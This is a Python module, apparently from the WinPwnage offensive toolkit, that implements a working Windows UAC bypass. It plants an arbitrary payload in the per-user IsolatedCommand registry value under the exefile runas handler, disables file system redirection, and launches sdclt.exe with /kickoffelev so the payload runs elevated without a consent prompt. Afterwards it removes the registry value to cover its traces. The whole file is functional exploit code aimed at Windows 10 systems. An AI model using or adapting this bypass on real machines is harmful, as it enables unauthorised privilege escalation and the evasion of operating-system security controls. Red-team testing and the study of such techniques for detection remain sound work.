import os
import time
from winpwnage.core.prints import *
from winpwnage.core.utils import *

sdcltisolatedcommand_info = {
	"Description": "Bypass UAC using sdclt (isolatedcommand) and registry key manipulation",
	"Id": "5",
	"Type": "UAC bypass",
	"Fixed In": "17025" if not information().uac_level() == 4 else "0",
	"Works From": "10240",
	"Admin": False,
	"Function Name": "sdclt_isolatedcommand",
	"Function Payload" : True,
}


def sdclt_isolatedcommand_cleanup(path):
	print_info("Performing cleaning")
	if registry().remove_key(hkey="hkcu", path=path, name="IsolatedCommand", delete_key=False):
		print_success("Successfully cleaned up")
		print_success("All done!")		
	else:
		print_error("Unable to cleanup")
		return False

def sdclt_isolatedcommand(payload):
	if payloads().exe(payload):
		path = "Software\\Classes\\exefile\\shell\\runas\\command"

		if registry().modify_key(hkey="hkcu", path=path, name="IsolatedCommand", value=payload, create=True):
			print_success("Successfully created IsolatedCommand key containing payload ({payload})".format(payload=os.path.join(payload)))
		else:
			print_error("Unable to create registry keys")
			return False

		time.sleep(5)

		print_info("Disabling file system redirection")
		with disable_fsr():
			print_success("Successfully disabled file system redirection")
			if process().create("sdclt.exe", params="/kickoffelev"):
				print_success("Successfully spawned process ({})".format(payload))
				time.sleep(5)
				sdclt_isolatedcommand_cleanup(path)
			else:
				print_error("Unable to spawn process ({})".format(os.path.join(payload)))
				for x in Constant.output:
					if "error" in x:
						sdclt_isolatedcommand_cleanup(path)
						return False
	else:
		print_error("Cannot proceed, invalid payload")
		return False